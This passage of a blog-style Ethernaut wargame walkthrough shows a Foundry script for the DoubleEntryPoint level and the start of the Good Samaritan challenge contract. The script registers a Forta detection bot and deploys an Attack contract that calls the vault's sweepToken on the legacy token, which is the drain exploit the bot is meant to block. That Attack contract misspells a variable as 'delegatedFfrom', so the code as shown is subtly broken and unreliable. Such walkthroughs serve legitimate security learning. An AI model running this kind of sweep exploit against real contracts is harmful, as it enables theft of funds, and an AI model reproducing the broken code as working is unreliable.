</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.24</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level26.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level26Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    DoubleEntryPoint </span><span class="token" style="color:#569CD6">public</span><span> dep </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">DoubleEntryPoint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xcE33ED049f763622a132480D7348B212777Ee61E</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#ce9178">address</span><span> cryptoVault </span><span class="token" style="color:#d4d4d4">=</span><span> dep</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">cryptoVault</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> player </span><span class="token" style="color:#d4d4d4">=</span><span> dep</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">player</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> delegatedFrom </span><span class="token" style="color:#d4d4d4">=</span><span> dep</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">delegatedFrom</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;CryptoVault is &quot;</span><span class="token" style="color:#d4d4d4">,</span><span>cryptoVault</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Player is &quot;</span><span class="token" style="color:#d4d4d4">,</span><span>player</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;LegacyToken is &quot;</span><span class="token" style="color:#d4d4d4">,</span><span>delegatedFrom</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        LegacyToken lgt </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">LegacyToken</span><span class="token" style="color:#d4d4d4">(</span><span>delegatedFrom</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        CryptoVault cv </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">CryptoVault</span><span class="token" style="color:#d4d4d4">(</span><span>cryptoVault</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Balance of DET in CryptoVault&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> dep</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>cryptoVault</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Balance of LGT in CryptoVault&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> lgt</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>cryptoVault</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;The following two address are same&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Delegate of Legacytoken contract&quot;</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>lgt</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">delegate</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;DET :&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>dep</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        Forta forta </span><span class="token" style="color:#d4d4d4">=</span><span> dep</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">forta</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#6a9955">//registering bot</span><span>
</span><span>        DetectionBot bot </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">DetectionBot</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        forta</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">setDetectionBot</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>bot</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;BOT ALERTS Before  exploit :&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> forta</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">botRaisedAlerts</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>bot</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">//reverted by bot when it tries to exploit</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Cryptovault balance of DET :&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> dep</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>cryptoVault</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;BOT alerts after exploit: &quot;</span><span class="token" style="color:#d4d4d4">,</span><span>forta</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">botRaisedAlerts</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>bot</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    DoubleEntryPoint </span><span class="token" style="color:#569CD6">public</span><span> dep </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">DoubleEntryPoint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xcE33ED049f763622a132480D7348B212777Ee61E</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> cryptoVault </span><span class="token" style="color:#d4d4d4">=</span><span> dep</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">cryptoVault</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> delegatedFrom </span><span class="token" style="color:#d4d4d4">=</span><span> dep</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">delegatedFrom</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        CryptoVault cv </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">CryptoVault</span><span class="token" style="color:#d4d4d4">(</span><span>cryptoVault</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        cv</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">sweepToken</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>delegatedFfrom</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">DetectionBot</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    DoubleEntryPoint </span><span class="token" style="color:#569CD6">public</span><span> dep </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">DoubleEntryPoint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xcE33ED049f763622a132480D7348B212777Ee61E</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span>  cryptoVault </span><span class="token" style="color:#d4d4d4">=</span><span> dep</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">cryptoVault</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">handleTransaction</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> user</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">bytes</span><span> </span><span class="token" style="color:#569CD6">calldata</span><span> msgData</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>        </span><span class="token" style="color:#ce9178">address</span><span> origSender</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">assembly</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            origSender</span><span class="token" style="color:#d4d4d4">:=</span><span>  </span><span class="token" style="color:#dcdcaa">calldataload</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xa8</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>        </span><span class="token" style="color:#569CD6">if</span><span class="token" style="color:#d4d4d4">(</span><span>origSender </span><span class="token" style="color:#d4d4d4">==</span><span> cryptoVault</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#dcdcaa">Forta</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">raiseAlert</span><span class="token" style="color:#d4d4d4">(</span><span>user</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level26Solution.s.sol:Level26Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Good Samaritan</h2>
<p><strong>Level27.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">&gt;=</span><span class="token version" style="color:#b5cea8">0.8.0</span><span> </span><span class="token" style="color:#d4d4d4">&lt;</span><span class="token version" style="color:#b5cea8">0.9.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;openzeppelin-contracts/contracts/utils/Address.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">GoodSamaritan</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    Wallet </span><span class="token" style="color:#569CD6">public</span><span> wallet</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    Coin </span><span class="token" style="color:#569CD6">public</span><span> coin</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        wallet </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Wallet</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        coin </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Coin</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>wallet</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        wallet</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">setCoin</span><span class="token" style="color:#d4d4d4">(</span><span>coin</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">requestDonation</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">returns</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span> enoughBalance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#6a9955">// donate 10 coins to requester</span><span>
</span><span>        try wallet</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">donate10</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span> catch </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> err</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">keccak256</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodeWithSignature</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;NotEnoughBalance()&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#dcdcaa">keccak256</span><span class="token" style="color:#d4d4d4">(</span><span>err</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>                </span><span class="token" style="color:#6a9955">// send the coins left</span><span>
</span><span>                wallet</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transferRemainder</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>                </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#569cd6">false</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Coin</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">using</span><span> </span><span class="token" style="color:#4ec9b0">Address</span><span> </span><span class="token" style="color:#569CD6">for</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">mapping</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#d4d4d4">=&gt;</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> balances</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    error </span><span class="token" style="color:#dcdcaa">InsufficientBalance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint256</span><span> current</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span> required</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> wallet_</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#6a9955">// one million coins for Good Samaritan initially</span><span>
</span><span>        balances</span><span class="token" style="color:#d4d4d4">[</span><span>wallet_</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">10</span><span class="token" style="color:#d4d4d4">**</span><span class="token" style="color:#b5cea8">6</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> dest_</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span> amount_</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">uint256</span><span> currentBalance </span><span class="token" style="color:#d4d4d4">=</span><span> balances</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#6a9955">// transfer only occurs if balance is enough</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">if</span><span class="token" style="color:#d4d4d4">(</span><span>amount_ </span><span class="token" style="color:#d4d4d4">&lt;=</span><span> currentBalance</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            balances</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">-=</span><span> amount_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            balances</span><span class="token" style="color:#d4d4d4">[</span><span>dest_</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">+=</span><span> amount_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>            </span><span class="token" style="color:#6a9955">//if(dest_.isContract()) {</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>dest_</span><span class="token" style="color:#d4d4d4">.</span><span>code</span><span class="token" style="color:#d4d4d4">.</span><span>length </span><span class="token" style="color:#d4d4d4">!=</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>                </span><span class="token" style="color:#6a9955">// notify contract</span><span>
</span><span>                </span><span class="token" style="color:#dcdcaa">INotifyable</span><span class="token" style="color:#d4d4d4">(</span><span>dest_</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">notify</span><span class="token" style="color:#d4d4d4">(</span><span>amount_</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#569CD6">else</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">revert</span><span> </span><span class="token" style="color:#dcdcaa">InsufficientBalance</span><span class="token" style="color:#d4d4d4">(</span><span>currentBalance</span><span class="token" style="color:#d4d4d4">,</span><span> amount_</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Wallet</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#6a9955">// The owner of the wallet instance</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> owner</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    Coin </span><span class="token" style="color:#569CD6">public</span><span> coin</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    error </span><span class="token" style="color:#dcdcaa">OnlyOwner</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    error </span><span class="token" style="color:#dcdcaa">NotEnoughBalance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
